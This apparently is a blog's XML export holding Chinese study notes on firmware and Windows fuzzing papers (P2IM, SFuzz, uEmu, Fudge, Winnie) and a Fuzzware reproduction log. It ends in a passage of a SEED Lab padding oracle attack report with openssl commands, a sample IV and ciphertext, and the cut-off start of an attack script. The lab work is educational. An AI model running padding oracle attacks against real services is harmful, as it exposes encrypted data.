        <tag>Fuzz</tag>
        <tag>固件模拟</tag>
      </tags>
  </entry>
  <entry>
    <title>P2IM论文笔记</title>
    <url>/posts/1c19887b.html</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>背景：</strong>模拟以MCU为处理器的固件设备并没有完全的模拟外设，导致fuzzing时外设需要实际物理设备，速度偏慢，且没有达到完全模拟。</p>
<p>主要实现了一个可以模拟在MCU下运行的固件的模拟器P2IM。通过自动化外设接口的建模来进行自动化，可扩展的模拟。</p>
<p>特点：对mcu架构下的寄存器进行分类识别，在qemu模拟时同时模拟这些寄存器值的操作，从而模拟出了firmware外设的一系列操作。保证了firmware在qemu上的稳定运行的同时加入了外设的模拟。</p>
<h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><p>当时对固件的模拟需要软硬件结合，导致fuzz的效率很慢，因此提出了一种模拟器对固件完全模拟的思路，通过实现对固件外设寄存器的分类并模拟以达到完全模拟的目的。</p>
<h2 id="主要贡献"><a href="#主要贡献" class="headerlink" title="主要贡献"></a>主要贡献</h2><p>实现了对无硬件模拟</p>
<p>提出了P2IE（外设接口等效属性）：为了定义怎样的仿真是好的仿真</p>
<p>提出了MMIO寄存器四种模型：对四种模型的行为进行了定义</p>
<p>探索性执行技术</p>
<h2 id="尚存不足"><a href="#尚存不足" class="headerlink" title="尚存不足"></a>尚存不足</h2><ul>
<li><p>寄存器分类可能存在错误（eg: 某些SR会错分类为DR，导致fuzz时将其作为输入，效率下降。）</p>
</li>
<li><p>代码覆盖率不够高</p>
<ul>
<li>存在僵尸代码：写了但是没有使用上的代码</li>
<li>模糊器太基础：只用了最简单的AFL</li>
<li>假挂起情况：出现了两次假挂起的情况，一次是由于DR被错误分类为了CR；另一次是出现了DMA操作，P2IM不予处理</li>
<li>输入保持：作者发现不仅是输入值，输入持续的时间也会影响固件逻辑的执行</li>
</ul>
</li>
</ul>
<h2 id="具体内容"><a href="#具体内容" class="headerlink" title="具体内容"></a>具体内容</h2><h3 id="Processor-Peripheral-Interface-Equivalence："><a href="#Processor-Peripheral-Interface-Equivalence：" class="headerlink" title="Processor-Peripheral Interface Equivalence："></a><strong>Processor-Peripheral Interface Equivalence</strong>：</h3><p>1）模拟器模拟了外设接口，而不是外设本身；2）模拟接口要与固件提供的外设行为相同，以便顺利运行</p>
<p><strong>该文章模拟的寄存器为</strong>①②类，③由于不同设备差异较大不涉及。</p>
<img src="/posts/1c19887b/figure_2.png" class="" title="figure_2">

<h3 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a><strong>实现步骤</strong></h3><img src="/posts/1c19887b/Figure_3.png" class="" title="Figure_3">

<ol>
<li>根据专家对MCU的架构以及寄存器操作构建抽象模型，主要是总结了寄存器的类别和中断的类型。</li>
<li>模型的实例化，将抽象模型具体化为可用于特定固件模拟的模型。主要是根据固件对寄存器的操作类型以及后续的访问方式将寄存器进行分类以及设置中断。</li>
</ol>
<h4 id="抽象模型构建"><a href="#抽象模型构建" class="headerlink" title="抽象模型构建"></a>抽象模型构建</h4><h5 id="寄存器种类"><a href="#寄存器种类" class="headerlink" title="寄存器种类"></a>寄存器种类</h5><p>外设寄存器会被映射到固定内存区域（0x40000000-0x5fffffff）</p>
<p><strong>Control Registers（CR）</strong>：</p>
<ul>
<li>Access Pattern：RMW，大部分为先读，再修改，再写回。因为可能会有其他控制参数。所以需要先保存数据。小部分会是直接写入，模型会分类为DR（Data Registers），但是此类寄存器之后不会在被读取，因此对固件运行没有影响。</li>
<li>Access Handling：模拟器将分类好的CR作为永久变量，不再改变。</li>
</ul>
<p><strong>Status Registers（SR）：</strong></p>
<ul>
<li>Access Pattern：若对寄存器访问为非条件读，且读取到的值作为了判断条件。则可以作为SR。部分情况下，可能会是直接写入，则会导致SR错判为DR，不过可以在后续再次访问时进行修改（polls）</li>
<li>Access handling：SR经常变化，P2IM使用探索式执行的方式来自动推断SR值（遍历取最优），对于SR的写操作则显得没有必要，因此直接忽略SR写入。</li>
</ul>
<p><strong>Data Registers（DR）</strong>：</p>
<ul>
<li>Access Pattern：若寄存器是被SR读后访问的，或者是直接写入的，那么将其作为DR</li>
<li>Access Handling：理想的Fuzzing接口。</li>
</ul>
<p><strong>Control-Status Register（C&amp;SR）</strong>：</p>
<p>有些寄存器既可以做CR又可以做SR，不过由于CR是在外设配置阶段进行修改，SR为在外设运行阶段进行修改，所以只需在不同时刻将其按不同分类识别即可。</p>
<h5 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h5><p>直接使用基于代码块的中断方式（简单，易于复现）每执行1000个基本块后进行一次中断。</p>
<h5 id="并没有对不可行输入进行判别：1）可以作为Fuzzer的改进；2）如果攻击者已经攻陷设备，则也有可能进行这些操作"><a href="#并没有对不可行输入进行判别：1）可以作为Fuzzer的改进；2）如果攻击者已经攻陷设备，则也有可能进行这些操作" class="headerlink" title="并没有对不可行输入进行判别：1）可以作为Fuzzer的改进；2）如果攻击者已经攻陷设备，则也有可能进行这些操作"></a>并没有对不可行输入进行判别：1）可以作为Fuzzer的改进；2）如果攻击者已经攻陷设备，则也有可能进行这些操作</h5><h4 id="自动构建具体模型"><a href="#自动构建具体模型" class="headerlink" title="自动构建具体模型"></a>自动构建具体模型</h4><img src="/posts/1c19887b/Figure_4.png" class="" title="Figure_4">

<p>实例化过程与fuzzing过程同时进行，相互补充。首先进行fuzzer输入，如果模型由于未实例化的部分而停止，那么就停止fuzzing，根据已有的fuzzing输入信息进行实例化，如果实例化过程结束则继续进行fuzz。</p>
<p><strong>模型实例化主要内容：</strong></p>
<ul>
<li>识别内存映射的寄存器类型，内存位置</li>
<li>每个寄存器的访问处理方式</li>
<li>启用的中断类型</li>
</ul>
<p>注：同一外设的内存映射寄存器通常在内存区域地址是连续的，可以根据此特点将寄存器归为同一个外设，方便后续的优化。</p>
<h5 id="Explorative-Execution"><a href="#Explorative-Execution" class="headerlink" title="Explorative Execution"></a>Explorative Execution</h5><p>前面提到了SR由于频繁变化的特性，导致每次需要调用其值时，都无法确定其正确值，因此采用了探索式执行的方式来确定SR的最优解</p>
<p>通过遍历SR的可能取值（32位只考虑同时只存在一个bit为1的情况），共32种情况，只需新建32个线程同时运行，查看哪个线程运行效果最好来确定结果（通过查看在跳出函数时的情况来判断）</p>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>IS</tag>
        <tag>IoT</tag>
        <tag>Fuzz</tag>
        <tag>固件模拟</tag>
      </tags>
  </entry>
  <entry>
    <title>SFuzz论文笔记</title>
    <url>/posts/69313c9b.html</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>RTOS系统当下并没有很好的分析方式，因此作者提出了sfuzz工具，利用RTOS每一项任务的控制流都是独立的特点，从RTOS系统中切出独立的代码块进行fuzzing。</p>
<p>项目地址：<a href="https://github.com/NSSL-SJTU/SFuzz">https://github.com/NSSL-SJTU/SFuzz</a></p>
<h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><p>解决了在当时RTOS领域模糊测试没有很好的分析方式的问题。</p>
<h2 id="主要贡献"><a href="#主要贡献" class="headerlink" title="主要贡献"></a>主要贡献</h2><ul>
<li><p>提出了RTOS系统的特点：每一项任务的控制流都是相互独立的，通过代码切片获取到独立的代码树，分别进行分析</p>
</li>
<li><p>使用了前向切片与后向切片，根据依赖和函数调用关系获取了代码片段以供fuzz</p>
</li>
<li><p>设计了SFuzz，对RTOS进行灰盒测试。</p>
</li>
</ul>
<h2 id="尚存不足"><a href="#尚存不足" class="headerlink" title="尚存不足"></a>尚存不足</h2><h2 id="具体内容"><a href="#具体内容" class="headerlink" title="具体内容"></a>具体内容</h2><p>sfuzzing一共分为四个模块，分别为Forward slicer，Control Flow Nodes Handler，Micro Fuzzing，Concolic Analyzer。</p>


<h3 id="Forward-Slicer"><a href="#Forward-Slicer" class="headerlink" title="Forward Slicer"></a>Forward Slicer</h3><p>由上图可知，forward slicer分为四个步骤，分别为恢复函数语义，根据函数语义构建相关函数调用图，修剪调用图，连接调用图。</p>
<p><strong>恢复函数语义</strong>：使用四种方法来恢复函数（1：接受用户输入的函数；2：sink函数；3：设置或接收全局变量的函数）。确定用户输入点，全局变量访问函数，sink函数。</p>
<ul>
<li>Symbol &amp; log Function：通过供应商给出的symbol，log function得出函数名的标签。</li>
<li>Virtual Execution：根据将函数接收参数数量和返回值与标准库函数比较，找出可能对应的库函数，然后进行内存分配，初始化寄存器和参数变量，最终模拟函数运行并根据运行结果和内存空间来识别标准库函数</li>
<li>Web Service Semantic：通过前后端文件来标记用户输入</li>
<li>Open Source firmware：一些供应商的产品是基于开源的RTOS系统改写而成，因此可以根据开源代码来匹配函数。</li>
</ul>
<p><strong>根据函数语义构建相关函数调用图</strong>：根据用户输入函数以及全局变量访问点，以这些函数的调用函数作为根节点，然后根据函数调用关系建立调用图</p>
<p><strong>函数调用图修剪</strong>：使用基于语义的污点分析，将相关的函数调用保留下来。</p>
<p><strong>调用图连接</strong>：由于某些全局输入的数据流可以被数据共享函数干扰，因此需要将这些有关的连接起来。</p>
<ul>
<li><p>对于存取常量的数据共享函数，根据常量值将相关节点连接起来，(&lt;nvram_set, nvram_get&gt;)</p>
</li>
<li><p>对于存取动态变量的函数，如下图<code>wan0_pppoe_username</code>，通过虚拟条件节点连接，在动态运行时根据实际变量值来确定是否跳转到输入点。</p>
</li>
</ul>
<h3 id="Control-Flow-Nodes-Handler"><a href="#Control-Flow-Nodes-Handler" class="headerlink" title="Control Flow Nodes Handler"></a>Control Flow Nodes Handler</h3><p>在通过前向切片获取到函数相关调用图以及基于此生成函数执行树后，control flow nodes handler需要在此基础上补全代码（补充上下文）以便进行后续的fuzzing测试。主要用于引导后续fuzzer fuzz的路径</p>
<blockquote>
<p>In other words, because of lacking full context and runtime state of the<br>RTOS, we need strategies to guide the fuzzer to determine how to handle the function call in the snippet and choose which branch of<br>the conditional statement to jump  </p>
</blockquote>
<ul>
<li>Call Instruction：如果函数的参数不受外界输入影响，那么将其加入<code>PatchedFunc</code>集合以便后续fuzzer识别，从而跳过此函数。</li>
<li>Conditional Branch：如果控制流存在条件分支，则根据条件与用户输入之间关系以及分支是否可以到达sink点来分情况讨论<ul>
<li>只有一个分支可以到达sink点，如果条件可以被输入影响，那么将无法到达sink的分支地址加入<code>PatchedJMP</code>集合，防止fuzzer探索该分支；否则，如果用户输入无法影响条件，则让将到达sink点分支地址添加到<code>PatchedJMP</code>集合，让fuzzer直接进入该分支。</li>
<li>两条分支都可以进入sink点，若条件可以被输入影响，那么不改变代码，让fuzzer随机生成输入来探索路径；否则将条件指令添加到<code>PatchedJMP</code>集合，让fuzzer将条件判断转换为随机的跳转地址</li>
<li>若没有分支可以到达sink点，那么将两个分支的地址加入<code>PatchedJMP</code>集合，让fuzzer当发现这些地址时退出path exploration</li>
</ul>
</li>
</ul>
<h3 id="Micro-Fuzzing"><a href="#Micro-Fuzzing" class="headerlink" title="Micro Fuzzing"></a>Micro Fuzzing</h3><p>一种slice_based fuzzing。将代码片段作为输入，探索执行树的执行路径。fuzzer会根据<code>PatchedFunc</code>集合与<code>PatchedJMP</code>集合指导下进行fuzzing。</p>
<p>其中，由于RTOS的缺乏对内存保护的机制，sfuzz提供了内存检查机制来检测是否存在栈溢出等漏洞。</p>
<h3 id="Concolic-Analyzer"><a href="#Concolic-Analyzer" class="headerlink" title="Concolic Analyzer"></a>Concolic Analyzer</h3><p>micro fuzzing提供fuzz成功的输入给concolic analyzer进行验证，concolic会恢复代码块的上下文进行验证crash input是否可以正确触发漏洞。</p>


<p>如上图代码示例，通过前向切片可以得出用户输入为line 8 <code>ledClsTime</code>，输出的sink点为line 17 <code>nvram_set</code>，通过前向切片有条件分支</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">11</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(ledCtlType , ledStatus))</span><br><span class="line"><span class="number">12</span> nvram_set(<span class="string">&quot;led_ctl_type&quot;</span>, ledStatus);</span><br><span class="line"><span class="number">13</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(<span class="string">&quot;2&quot;</span>, ledStatus) ) &#123;</span><br><span class="line"><span class="number">14</span> ledTime = nvram_get(<span class="string">&quot;led_time&quot;</span>); <span class="comment">// Other input #3</span></span><br><span class="line"><span class="number">15</span> sub_800D487C(a2, argbuf);</span><br><span class="line"><span class="number">16</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(ledTime , ledClsTime))</span><br><span class="line"><span class="number">17</span> nvram_set(<span class="string">&quot;led_time&quot;</span>, ledClsTime); <span class="comment">// Global data set</span></span><br><span class="line"><span class="number">18</span> &#125;</span><br></pre></td></tr></table></figure>

<p>条件分支涉及到了其他输入<code>ledCtlType</code>，<code>ledStatus</code>，<code>ledTime</code>，可以通过约束求解器来进行求解。</p>
<p>但是仅依靠前向切片的问题是无法确定其他输入是否真的可以影响sink条件分支。例如line11即无法改变sink点是否可达。因此需要通过后向切片查看是否会对结果产生影响，从而将line11删去。</p>
<p>同时，后向切片也会查看sink函数中被写入对象的大小，从而确定是否可以真的实现溢出。eg: <code>vulnGet</code></p>
<h2 id="知识点补充"><a href="#知识点补充" class="headerlink" title="知识点补充"></a>知识点补充</h2><p>前向切片与后向切片：<a href="https://blog.csdn.net/hmysn/article/details/124717162">https://blog.csdn.net/hmysn/article/details/124717162</a></p>
<p>FDT：<a href="https://blog.csdn.net/qq_44370676/article/details/120836743">https://blog.csdn.net/qq_44370676/article/details/120836743</a></p>
<p>AFL（基于coverage_guide的fuzzing工具）<a href="https://www.freebuf.com/articles/system/191543.html">https://www.freebuf.com/articles/system/191543.html</a></p>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>IoT</tag>
        <tag>Fuzz</tag>
        <tag>固件模拟</tag>
      </tags>
  </entry>
  <entry>
    <title>linux虚拟机设置github加速</title>
    <url>/posts/d1a2e76c.html</url>
    <content><![CDATA[<p>最近在使用vmware虚拟机跑项目复现，需要频繁使用github，因此在此记录下github加速的简单方法</p>
<p><a href="https://zhuanlan.zhihu.com/p/432414619">https://zhuanlan.zhihu.com/p/432414619</a></p>
]]></content>
      <tags>
        <tag>github</tag>
        <tag>vmware</tag>
        <tag>代理</tag>
      </tags>
  </entry>
  <entry>
    <title>uEmu论文笔记</title>
    <url>/posts/65903227.html</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>设计了μEmu，使用动态符号执行的方式规避了P2IM需要人工参与基于Access-Pattern对MMIO进行分类的问题，但是存在了路径消失的问题。</p>
<h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><p>当前已有的对固件模拟方法有在硬件上进行模拟，完全脱离硬件模拟等方式，但都有其缺点。例如结合硬件会使fuzzing效率降低，模拟外设P2IM存在寄存器错分类。</p>
<p>uEmu采用动态符号执行技术对固件进行fuzz。</p>
<h2 id="主要贡献"><a href="#主要贡献" class="headerlink" title="主要贡献"></a>主要贡献</h2><ul>
<li>提出了固件的模拟执行会同时受到多个外设寄存器的影响。更加重视寄存器在执行时序上的依赖关系。（P2IM相较于此则是规定了固定的MMIO访问规则。实际上并不必须）</li>
<li>采用动态符号执行求解寄存器的依赖关系和满足条件解。</li>
<li>使用深度优先搜索进行动态执行，从而避免了路径爆炸的问题，不过也一定程度上造成了路径消失的问题。</li>
<li>提出了将寄存器约束求解存储到知识库的概念，知识库的树状结构。</li>
</ul>
<h2 id="尚存不足"><a href="#尚存不足" class="headerlink" title="尚存不足"></a>尚存不足</h2><p>存在路径消失</p>
<h2 id="实现细节"><a href="#实现细节" class="headerlink" title="实现细节"></a>实现细节</h2><p>分为两个阶段：知识提取阶段和动态分析阶段</p>
<p>使用了S2E平台与Qemu工具，具体结构如下</p>
<img src="/posts/65903227/Figure_2.png" class="" title="Figure_2">

<h3 id="知识提取阶段"><a href="#知识提取阶段" class="headerlink" title="知识提取阶段"></a>知识提取阶段</h3><p>通过挂钩固件对MMIO的写操作，将MMIO寄存器存入知识库（KB）。之后再根据符号化执行来增加MMIO的约束，根据约束求解MMIO特定值并且根据不同MMIO值进入不同分支，在此过程中需要保持固件运行状态为valid（有评价指标），如果MMIO进入分支是invalid，则更换MMIO值，切换到另一分支，在此过程中MMIO分配的值会以分层cache的形式存储在KB中。</p>
<h4 id="根据不同情况，将cache形式分为4类。"><a href="#根据不同情况，将cache形式分为4类。" class="headerlink" title="根据不同情况，将cache形式分为4类。"></a>根据不同情况，将cache形式分为4类。</h4><ul>
<li><p>T0：严格来说并不是一个匹配规则，而是对大部分外设寄存器存储建模，对MMIO进行写操作时，将对应的值存储到KB中，再之后需要读取时返回相应的值即可。如果导致程序进入invalid状态，则更新到T1。</p>
</li>
<li><p>T1：不只记录值，而且记录其寄存器地址和PC（Program Counter）值加以区分。（由于大部分外设寄存器在特定PC处值是固定的），当进入到invalid状态时，更新到T2规则进行匹配</p>
</li>
<li><p>T2：当寄存器地址与PC均相同时，需要T2进行区分，添加了对上下文参数（上三级调用函数PC值+函数参数）的哈希值。如下图<code>UART_WaitOnFlagUntilTimeout</code>函数，两个函数如果都用T1规则匹配，会返回相同值，但是会导致系统异常。因此需要T2规则，因为调用者的PC不同（line3，line7）.</p>
<img src="/posts/65903227/Listing_2.png" class="" title="Listing_2">
</li>
<li><p>T3：当上下文也相同时，将读取操作分为一个列表，按字符单位逐步读取（符号化执行也是使用了按字节分为多个符号）。如下图，若使用T2规则，由于上下文完全相同，导致返回给该函数的四个字节只能是“OOOO”，所以需要按照字节为单位生成四个符号。读取时逐步读取。</p>
<img src="/posts/65903227/image-20231205111046993.png" class="" title="image-20231205111046993"></li>
</ul>
<h4 id="invalid执行状态判断标准"><a href="#invalid执行状态判断标准" class="headerlink" title="invalid执行状态判断标准"></a>invalid执行状态判断标准</h4><ul>
<li>死循环：如果寄存器包含符号变量，uEmu将其解为具体值并作比较，如果发现重复则证明是死循环。（检查范围为30个代码基本块，main函数）</li>
<li>长循环：固件在等待某种特定操作，导致超时。如果发现循环次数超过2000即认为为长循环</li>
<li><strong>非法读写</strong>：非法访问未装载内存，装载的内存包括（ROM，RAM，系统区域和外设区域）</li>
<li>用户定义：例如断言失败操作。</li>
</ul>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>IoT</tag>
        <tag>Fuzz</tag>
        <tag>固件模拟</tag>
        <tag>论文复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Fuzzware复现</title>
    <url>/posts/6b4c8ab1.html</url>
    <content><![CDATA[<p>项目链接：<a href="https://github.com/fuzzware-fuzzer/fuzzware">https://github.com/fuzzware-fuzzer/fuzzware</a></p>
<h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1. 环境"></a>1. 环境</h2><p>Ubuntu22.04</p>
<p>docker</p>
<p>具体过程比较简单，可以直接看github readme</p>
<h2 id="2-复现"><a href="#2-复现" class="headerlink" title="2. 复现"></a>2. 复现</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./run_docker.sh examples fuzzware pipeline --skip-afl-cpufreq pw-recovery/ARCH_PRO</span><br></pre></td></tr></table></figure>

<p>由图可以看到刚开始运行时发现新的MMIO寄存器模型，由于MMIO Access Model中并不存在，因此会将其定义为新的模型，然后继续向下运行</p>
<img src="/posts/6b4c8ab1/image-20231220101350682.png" class="" title="image-20231220101350682">

<p>建模完毕后，开始进行正常的fuzzing阶段。</p>
<img src="/posts/6b4c8ab1/image-20231220101721217.png" class="" title="image-20231220101721217">

<p>一轮fuzzing结束后，根据反馈调整输入，开始下一阶段fuzzing。</p>
<img src="/posts/6b4c8ab1/image-20231220101952436.png" class="" title="image-20231220101952436">]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>IS</tag>
        <tag>IoT</tag>
        <tag>Fuzz</tag>
        <tag>固件模拟</tag>
        <tag>论文复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Fudge论文笔记</title>
    <url>/posts/edb8c304.html</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>google针对c与c++库提出了新的fuzz driver自动化生成方式。</p>
<h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><p>对C&#x2F;C++库代码片段的slice_based_fuzz。</p>
<h2 id="主要贡献"><a href="#主要贡献" class="headerlink" title="主要贡献"></a>主要贡献</h2><p>基于google海量代码库进行测试，完成了Fudge可以有效的处理海量的代码。发现其中的安全漏洞</p>
<h2 id="尚存不足"><a href="#尚存不足" class="headerlink" title="尚存不足"></a>尚存不足</h2><p>fuzz基于源代码，可以考虑在编译源代码为可执行文件后加入动态符号执行等技术。（也在其Future Work中体现（还提到了Machine Learning））</p>
<h2 id="Fudge具体过程"><a href="#Fudge具体过程" class="headerlink" title="Fudge具体过程"></a>Fudge具体过程</h2><h3 id="Slicing-Phrase"><a href="#Slicing-Phrase" class="headerlink" title="Slicing Phrase"></a>Slicing Phrase</h3><p>从google代码库中选出有关库函数的代码，以FreeImage库为例，slicer模块会扫描整个代码库，运行每一个源文件，假设slicer处理如下代码：</p>


<p>slicer会分析函数的抽象语法树(AST)，假如函数中存在对目标库函数（需要有解析api接口，即输入）的调用，slicer首先选择所有FreeImage调用语句，然后根据控制流和数据流依赖关系来扩充语句。当其中符号不是在函数内部定义或类型不是目标库函数定义时，不挑选该符号，置为UnknownX（如上图imgData-&gt;width非库函数定义类型，mImageType也非库函数内部定义类型）</p>
<p>控制流与数据流依赖关系参考：[<a href="https://blog.csdn.net/hmysn/article/details/124717162]">https://blog.csdn.net/hmysn/article/details/124717162]</a></p>
<p>提取出的代码如下，slicer会重新建立新的ast以供下一阶段使用：</p>


<h3 id="Synthesis-phase"><a href="#Synthesis-phase" class="headerlink" title="Synthesis phase"></a>Synthesis phase</h3><p>Synthesis模块接收提取的代码片段并填充其成为可供fuzzer fuzzing的函数。</p>
<p>对于一个UnknownX有多种重写方式，以上图中mImageType为例，既可以作为fuzzer的fuzzing对象，又可以直接设置为默认值0或1等常量。</p>


<p>重写UnknownX的算法如下，将slicer提取到的代码段的ast列表作为输入，pop列表中ast，对其做完整性检查，若不完整，则对其中UnknownX进行重写，并将重写后的ast重新加入incomplete_asts列表（需要保证重写后ast不重复，增加了seen_before的检验），若完整则将ast加入到complete_asts列表中，一直循环直到incomplete_asts列表变为空值。</p>


<h3 id="Evaluation-phrase"><a href="#Evaluation-phrase" class="headerlink" title="Evaluation phrase"></a>Evaluation phrase</h3><p>评估fuzz driver是否合适的两个标准 1）是否fuzz了正确的api（人工检验），2）api是否正确调用（自动检验，通过比较target的崩溃时间）</p>
<p>另外还有评价好坏的标准：</p>
<ol>
<li>The candidate should build successfully.</li>
<li>It should run successfully without generating a crashing<br>input for at least a few seconds.</li>
<li>The size of the minimized corpus of the target should be<br>larger than some lower threshold.</li>
<li>The larger the number of lines of the library covered, the<br>better. We measure both absolute coverage and increase in<br>coverage relative to the existing fuzz drivers for the library.</li>
</ol>
<h3 id="User-Interface"><a href="#User-Interface" class="headerlink" title="User Interface"></a>User Interface</h3><p>提供了用户界面的ui。</p>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>IoT</tag>
        <tag>Fuzz</tag>
        <tag>固件模拟</tag>
        <tag>论文复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Winnie论文笔记</title>
    <url>/posts/ce05e772.html</url>
    <content><![CDATA[<h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><p>对当下Windows系统软件的fuzz没有合适的方法。提出了Winnie对Windows闭源软件进行fuzzing。</p>
<h2 id="主要贡献"><a href="#主要贡献" class="headerlink" title="主要贡献"></a>主要贡献</h2><ul>
<li>提出了Winnie，可以对Windows闭源软件进行模糊测试</li>
<li>实现了windows系统的fork方法，使得可以不用每次执行都得从头开始，提高了fuzzing效率，其中fork新进程的速度达到310次&#x2F;s显著高于windows自带CreateProcess91.9次&#x2F;s，与WSL的fork速度相近。</li>
</ul>
<h2 id="尚存不足"><a href="#尚存不足" class="headerlink" title="尚存不足"></a>尚存不足</h2><ul>
<li>由于闭源特性，无法全自动，需要人工参与fuzzer代码的生成</li>
</ul>
<h2 id="具体细节"><a href="#具体细节" class="headerlink" title="具体细节"></a>具体细节</h2><img src="/posts/ce05e772/image-20231220090115449.png" class="" title="image-20231220090115449">

<ul>
<li><p>生成fuzz代码</p>
<ul>
<li>Target Identification：确认二进制程序中可以用于fuzz的输入点（读取用户输入的api或函数）</li>
<li>Call-seq Recovery：恢复目标程序中函数体内对各个相关targetfunction调用的顺序（类似于fudge）</li>
<li>Argument Correction：恢复函数体的传入参数</li>
<li>Control-Data-flow：根据控制流和数据流依赖建立函数中各个api的关系。控制流依赖使用了静态分析，数据流依赖考虑了api的返回值与后面的api参数值的关系（直接用于下一个api参数，指针指向值作为下一个api参数）</li>
</ul>
</li>
<li><p>fork</p>
<ul>
<li>新建进程需要与CSRSS进程连接才能正常运行。</li>
<li>验证fork的子进程确实能够继承父进程变量值；fork实现是CoW（copy-on-write）</li>
<li>解决了多线程的问题。</li>
</ul>
</li>
<li><p>fuzzing</p>
<ul>
<li>使用了fullspeed fuzzing来收集代码覆盖率（根据遇到新的代码块来测算）</li>
<li><img src="/posts/ce05e772/image-20231220091346384.png" class="" title="image-20231220091346384"></li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>论文复现</tag>
        <tag>DSE</tag>
      </tags>
  </entry>
  <entry>
    <title>【SeedLab】Magic Padding Oracle实验报告</title>
    <url>/posts/8f883717.html</url>
    <content><![CDATA[<h2 id="1-Overview"><a href="#1-Overview" class="headerlink" title="1. Overview"></a>1. Overview</h2><p>Padding Oracle：一些系统在解密密文时，会先验证其填充是否合法，如果不合法则会抛出异常。针对此行为的攻击即为padding oracle攻击</p>
<h2 id="2-Lab-Environment"><a href="#2-Lab-Environment" class="headerlink" title="2. Lab Environment"></a>2. Lab Environment</h2><ul>
<li>Seed虚拟机</li>
<li>Labsetup.zip</li>
</ul>
<p>使用<code>dcbuild</code>和<code>dcup</code>命令启动docker环境</p>
<h2 id="3-Task1：Getting-Familiar-with-Padding"><a href="#3-Task1：Getting-Familiar-with-Padding" class="headerlink" title="3. Task1：Getting Familiar with Padding"></a>3. Task1：Getting Familiar with Padding</h2><p>Padding：分组加密算法要求明文长度需要为分组长度的整数倍。因此需要padding填充末尾使长度满足要求</p>
<p>使用<code>echo -n</code>创建文件P，长度为5。<code>-n</code>参数表示结尾不带换行符</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo -n &quot;12345&quot; &gt; P</span><br></pre></td></tr></table></figure>

<p>使用openssl命令对文件进行加密，并且对加密文件解密查看padding</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">加密</span></span><br><span class="line">openssl enc -aes-128-cbc -e -in P -out C</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解密</span></span><br><span class="line">openssl enc -aes-128-cbc -d -nopad -in C -out P_new</span><br></pre></td></tr></table></figure>

<p>结果如下，可以看出P_new文件内容末尾出现<code>&#39;\x0a&#39;</code>，文件长度变为16。表明加密过程进行了padding <code>&#39;\x0a&#39;</code>字符到16位的操作。</p>
<img src="/posts/8f883717/image-20231230192916386.png" class="" title="image-20231230192916386">

<p>分别尝试文件长度为10， 16的文件，结果如下，可以得出padding规律（要填充的位数作为填充字符）</p>
<img src="/posts/8f883717/image-20231230193317519.png" class="" title="image-20231230193317519">

<h2 id="4-Task2：Padding-Oracle-Attack（level-1）"><a href="#4-Task2：Padding-Oracle-Attack（level-1）" class="headerlink" title="4. Task2：Padding Oracle Attack（level 1）"></a>4. Task2：Padding Oracle Attack（level 1）</h2><p> 连接server端，获取到IV与密文</p>
<img src="/posts/8f883717/image-20231230193641177.png" class="" title="image-20231230193641177">

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">01020304050607080102030405060708	# IV</span><br><span class="line">a9b2554b0944118061212098f2f238cd779ea0aae3d9d020f3677bfcb3cda9ce # ciphertext</span><br></pre></td></tr></table></figure>

<p>可以与server交互，向server发送输入，输入应为IV+密文，server会使用其K和IV解密，并且返回padding是否有效。尝试通过返回信息来得出密文的真实内容。</p>
<p>server端对密文解密过程如下，为CBC模式。padding oracle攻击的原理为假设未知Plaintext P2的填充位为0x01，那么可以通过构造C1来与D2异或使解密的P2填充位为0x01，此时server端会返回Valid信息，可以解出未知的D2.当D2完全解出时，即可使用正确C1与D2异或获取明文。</p>
<img src="/posts/8f883717/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lhbGVjYWx0ZWNo,size_16,color_FFFFFF,t_70.png" class="" title="在这里插入图片描述">

<p><code>manual_attack.py</code>脚本如下，对通过尝试C1末位256种字符解出D2末位值：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"></span><br><span class="line"><span class="comment"># XOR two bytearrays</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">first, second</span>):</span><br><span class="line">   <span class="keyword">return</span> <span class="built_in">bytearray</span>(x^y <span class="keyword">for</span> x,y <span 